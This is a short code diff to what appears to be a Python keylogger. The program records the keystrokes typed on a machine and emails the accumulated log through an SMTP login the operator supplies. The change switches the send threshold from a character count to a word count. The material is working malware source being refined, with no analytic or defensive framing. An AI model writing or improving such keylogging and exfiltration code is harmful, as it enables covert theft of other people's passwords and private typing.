@@ -31,7 +31,7 @@ password = input("What Is Your Password (Don't Worry We're Not Stealing It): ")
 log = ' '
 keyLog = ""
 
-char_length = int(input("What Would You Like The Character Limit To Be Before The Email Is Sent: "))
+char_length = int(input("What Would You Like The Word Limit To Be Before The Email Is Sent: "))
 
 def sendMail(email,password, msg):
     try:
@@ -54,7 +54,7 @@ def keystroke(key):
     if key not in numLet:
         log+= '\n\n' f" {keyLog} \n {key} "   #'\n\n' works to ensure that the keystrokes show up as the message
         keyLog = ""
-        if len(log) >= char_length:
+        if len(log.split()) >= (char_length):
             sendMail(Email, password, log)
             log = ""
     elif key in numLet:
